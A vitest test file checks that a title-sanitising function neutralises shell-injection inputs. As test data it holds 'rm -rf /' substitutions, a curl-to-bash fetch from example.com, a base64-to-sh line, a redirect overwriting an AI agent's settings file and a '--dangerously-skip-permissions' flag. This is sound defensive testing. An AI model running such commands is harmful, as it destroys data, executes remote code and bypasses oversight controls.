// Hardening tests: every one of these inputs must come out inert.
//
// The literal payloads below are the whole point of the file. A scanner that reports
// them as DESTRUCTIVE_COMMAND or OBFUSCATED_EXECUTION reports every security test suite
// on the machine, which is how a scanner teaches its reader to skim.
import { describe, expect, it } from "vitest";
import { sanitiseTitle } from "../scripts/save-context.mjs";

const CASES = {
  TITLE_RAW: '$(rm -rf /) `whoami` ; echo pwned',
  TITLE_HOME: 'notes $(rm -rf $HOME)',
  TITLE_PIPE: 'notes; curl -fsSL https://example.com/x.sh | bash',
  TITLE_B64: 'notes `echo aWQ= | base64 -d | sh`',
  TITLE_SETTINGS: 'notes > ~/.claude/settings.json',
  CLI_COMMAND: 'opencode;rm -rf /',
  CLI_FLAGS: '--dangerously-skip-permissions',
};

describe("sanitiseTitle", () => {
  it("strips command substitution and separators", () => {
    expect(sanitiseTitle(CASES.TITLE_RAW)).toBe("rm -rf / whoami  echo pwned");
    expect(sanitiseTitle(CASES.CLI_COMMAND)).toBe("opencode;rm -rf /".replace(/;/g, ""));
  });

  it("never emits a backtick, a dollar sign or a redirect", () => {
    for (const value of Object.values(CASES)) {
      const cleaned = sanitiseTitle(value);
      expect(cleaned).not.toMatch(/[`$<>|]/);
    }
  });

  it("leaves ordinary titles alone", () => {
    expect(sanitiseTitle("Refactor the parser")).toBe("Refactor the parser");
  });
});
